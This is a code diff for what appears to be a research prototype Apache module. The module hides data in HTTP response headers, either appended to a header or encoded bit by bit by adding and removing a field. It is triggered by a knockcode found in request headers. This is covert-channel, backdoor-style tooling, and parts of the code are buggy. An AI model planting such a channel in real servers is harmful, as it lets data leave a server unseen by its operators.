@@ -30,18 +30,26 @@ void packet_decoder(request_rec *r, steg_config *config, server_config *svr){
 // Dispatcher function that reads the config vector and calls the appropiate encoder for outgoing responses
 void packet_encoder(request_rec *r, steg_config *config, server_config *svr){
 
-    apr_status_t rv;
+    apr_status_t rv = APR_SUCCESS;
 
-    //Read the data from the inputfile
+    // Read the data from the outputfile (only if the 'steganogram' buffer is empty)
+    // This buffer is only used for the 'Present' output method, so for 'Header' it will always be empty
     char data[PROTOCOL_MAX_PAYLOAD_SIZE];
-    rv = readline_outputfile(data, r->server);
+    if (strlen(svr->shm_memory->steganogram) == 0){
+        rv = readline_outputfile(data, r->server);
+    }
 
     // If there is no data to inject, just return
     if (rv != APR_SUCCESS) return ;
-    
-    //In the prototype, only straight head injection steganography will be used
+ 
+    // Header method
     if(!strcasecmp(config->outputmethod, "Header")){
         header_encoder(r, config, svr, data);
+        return;
+    }
+    // Present method
+    if(!strcasecmp(config->outputmethod, "Present")){
+        present_encoder(r, config, svr, data);
         return;
     }
 }
@@ -57,6 +65,7 @@ void header_decoder(request_rec *r, steg_config *config, server_config *svr){
 
     // Get the value of the HTTP header
     injected_header = apr_table_get(r->headers_in, config->inputmethodconfig);
+    if (injected_header == NULL) return;
 
     // Scan for the knockcode
     x = strstr(injected_header, config->knockcode);
@@ -176,14 +185,59 @@ void header_encoder(request_rec *r, steg_config *config, server_config *svr, cha
         injectedheader = apr_pstrcat(svr->pool, originalheader, payload, NULL);
         apr_table_set(r->headers_out, config->outputmethodconfig, injectedheader);
 
-        //TESTING
-        ap_log_rerror(APLOG_MARK, APLOG_CRIT, (apr_status_t) 0, r, "Header already existed: %s", originalheader);    
-
     //If the header is not there, we just add it
     }else{
         apr_table_set(r->headers_out, config->outputmethodconfig, payload);
     } 
-
-
-
 }
+
+void present_encoder(request_rec *r, steg_config *config, server_config *svr, char *data){
+
+    char *x;
+    int bit;
+    const char *originalheader, *injectedheader;
+
+    if (svr->shm_memory->steganogram_offset == 0) {
+        //Compute the payload: knockcode + length + data
+        apr_cpystrn(svr->shm_memory->steganogram, config->knockcode, 256); //Knockcode
+        x = svr->shm_memory->steganogram + strlen(config->knockcode);
+        x = int_to_string(x, strlen(data), PROTOCOL_LENGTH_SIZE); // Length  
+        apr_cpystrn(x, data, 256-strlen(config->knockcode)-PROTOCOL_LENGTH_SIZE); // Data
+        //Set the counter at the beginning
+        svr->shm_memory->steganogram_offset = 0;
+        ap_log_rerror(APLOG_MARK, APLOG_CRIT, (apr_status_t) 0, r, "Steganogram: %s", svr->shm_memory->steganogram);
+    }
+
+    ap_log_rerror(APLOG_MARK, APLOG_CRIT, (apr_status_t) 0, r, "Offset: %d", svr->shm_memory->steganogram_offset);
+    // Get the bit
+    bit = svr->shm_memory->steganogram[svr->shm_memory->steganogram_offset/8] >> (7 - (svr->shm_memory->steganogram_offset % 8))  & 0x01;
+
+    // Get the headers
+    originalheader = apr_table_get(r->headers_out, config->outputmethodconfig);
+
+    // If the bit is zero, make sure the field is absent
+    if (bit == 0 && originalheader != NULL) {
+        apr_table_unset(r->headers_out, config->outputmethodconfig);
+    }
+
+    // If the bit is one, make sure the field is present
+    if (bit == 1 && originalheader == NULL) {
+        char *somedata = "blahbalh";
+        apr_table_set(r->headers_out, config->outputmethodconfig, somedata);
+    }
+
+    // Increase the offset
+    svr->shm_memory->steganogram_offset += 1;
+    // If we reached the end of the buffer, cleanup
+    if (svr->shm_memory->steganogram_offset == strlen(svr->shm_memory->steganogram)*8){
+        memset(svr->shm_memory->steganogram, 0, CONFIG_FIELD_SIZE + PROTOCOL_MAX_PAYLOAD_SIZE + PROTOCOL_LENGTH_SIZE);
+        svr->shm_memory->steganogram_offset = 0;
+    }
+}
+
+
+
+
+
+
+
